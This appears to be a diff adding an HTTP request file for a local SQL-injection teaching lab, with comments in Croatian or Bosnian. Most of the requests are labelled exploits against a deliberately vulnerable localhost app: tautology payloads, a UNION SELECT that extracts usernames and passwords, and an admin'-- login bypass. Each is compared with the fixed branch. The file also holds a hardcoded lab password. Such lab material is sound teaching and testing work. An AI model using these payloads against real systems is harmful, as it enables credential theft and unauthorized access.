@@ -1,0 +1,30 @@
+### Lab07 – SQL injection
+@host = http://localhost:8000
+
+### 1. Legitimna pretraga (1 rezultat)
+GET {{host}}/api/lab07/products/search?q=Laptop
+
+### 2. EKSPLOATACIJA: tautologija otkriva skrivene proizvode
+# q = ' OR '1'='1' --  (URL-enkodirano). Ranjivo (main): vraca i "Interni prototip X".
+# Bez "--" (q = %' OR '1'='1) NE radi: visak %' iz izvornog upita daje uvjet '1'='1%' koji je lazan.
+GET {{host}}/api/lab07/products/search?q=%27%20OR%20%271%27%3D%271%27%20--
+
+### 2b. Varijanta: q = %' OR 1=1 --  (isti ucinak)
+GET {{host}}/api/lab07/products/search?q=%25%27%20OR%201%3D1%20--
+
+### 3. EKSPLOATACIJA: UNION izvlaci korisnicka imena/lozinke
+# q = %' UNION SELECT id, username, password, 0 FROM lab07_accounts --
+GET {{host}}/api/lab07/products/search?q=%25%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%200%20FROM%20lab07_accounts%20--
+
+### 4. EKSPLOATACIJA: zaobilazak prijave (admin'--)
+# Ranjivo (main): 200. Popravljeno: 401.
+POST {{host}}/api/lab07/login
+Content-Type: application/json
+
+{"username": "admin'--", "password": "bilosto"}
+
+### 5. Legitimna prijava (radi na obje grane)
+POST {{host}}/api/lab07/login
+Content-Type: application/json
+
+{"username": "admin", "password": "SuperTajna2026"}
